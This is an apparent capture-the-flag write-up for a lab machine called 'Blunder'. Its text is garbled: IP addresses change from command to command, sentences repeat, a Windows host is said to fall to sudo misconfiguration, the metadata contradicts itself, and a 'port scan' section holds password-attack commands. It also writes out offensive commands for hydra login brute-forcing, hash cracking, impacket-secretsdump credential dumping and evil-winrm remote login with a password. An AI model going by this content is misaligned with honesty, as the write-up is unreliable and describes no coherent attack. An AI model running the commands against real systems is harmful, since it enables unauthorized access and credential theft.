---
TitleSEO: "PwnTillDawn — Blunder (Easy Windows) | ZureFX"
TitlePost: "PwnTillDawn — Blunder (Easy Windows)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Blunder. Sudo Misconfiguration and Subdomain Takeover to achieve easy compromise on Windows."
Keywords: "easy, ctf, hard, reversing, hackthebox, forensics, linux"
URL: "https://zurefx.github.io/writeups/htb-blunder-860.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-blunder-860/"
Date: "2025-01-18"
Tags: "Easy, CTF, Hard, Reversing, HackTheBox, Forensics, Linux"
Section: "writeups"
Lang: "en"
main_img: "htb-blunder-860"
Permalink: "/writeups/htb-blunder-860.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Blunder** is rated **Easy** on PwnTillDawn. It runs **Windows** and the IP address during this analysis was `10.30.29.77`.

### Objectives

The backup files contained sensitive information that should not have been accessible. The application stored sensitive credentials in an unencrypted configuration file.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.22.215.134 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.51.19.71 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.27.206.239 -u administrator -p 'P@ssw0rd!' --shares
```

Group Policy Preferences contained encrypted but recoverable credentials. Group Policy Preferences contained encrypted but recoverable credentials.

### Service Enumeration

The backup files contained sensitive information that should not have been accessible. Unconstrained delegation was enabled on the compromised machine. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.100.12.43/FUZZ
feroxbuster -h
evil-winrm -i 10.121.106.148 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.119.173.58/FUZZ
```

Token impersonation allowed elevation to SYSTEM privileges on the target. The service account had excessive permissions assigned in Active Directory.

### SMB Enumeration

Command injection was possible through unsanitized user input in the search functionality. The target system was identified as running a vulnerable version of the service.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Lateral movement was facilitated by reusing discovered credentials across services. Privilege escalation was possible due to misconfigured sudo permissions. Weak file permissions allowed modification of critical system files.

## Exploitation

### Vulnerability Identification

The application stored sensitive credentials in an unencrypted configuration file. Token impersonation allowed elevation to SYSTEM privileges on the target. Network traffic analysis revealed unencrypted communications containing user credentials.

Key finding: **Sudo Misconfiguration**.

The service account had excessive permissions assigned in Active Directory. Privilege escalation was possible due to misconfigured sudo permissions.

### Initial Access

Network traffic analysis revealed unencrypted communications containing user credentials. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.10.62.171
```

The web application was vulnerable to Server-Side Template Injection (SSTI). Privilege escalation was possible due to misconfigured sudo permissions. The application stored sensitive credentials in an unencrypted configuration file.

## Privilege Escalation

### Enumeration

Weak file permissions allowed modification of critical system files. Network traffic analysis revealed unencrypted communications containing user credentials. The kernel version was outdated and vulnerable to a publicly known exploit.

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Exploitation

The scheduled task ran with elevated privileges and could be abused for escalation. Weak file permissions allowed modification of critical system files.

```powershell
evil-winrm -i 10.55.46.101 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.83.230.93 -u administrator -p 'P@ssw0rd!'
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Command injection was possible through unsanitized user input in the search functionality.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The scheduled task ran with elevated privileges and could be abused for escalation. Initial enumeration revealed several interesting open ports on the target.

## Summary

### Tools Used

- `rpcclient`
- `rubeus`
- `enum4linux`
- `socat`
- `netcat`
- `psexec`
- `dcomexec`
- `evil-winrm`

### Key Takeaways

- Sudo Misconfiguration
- Subdomain Takeover
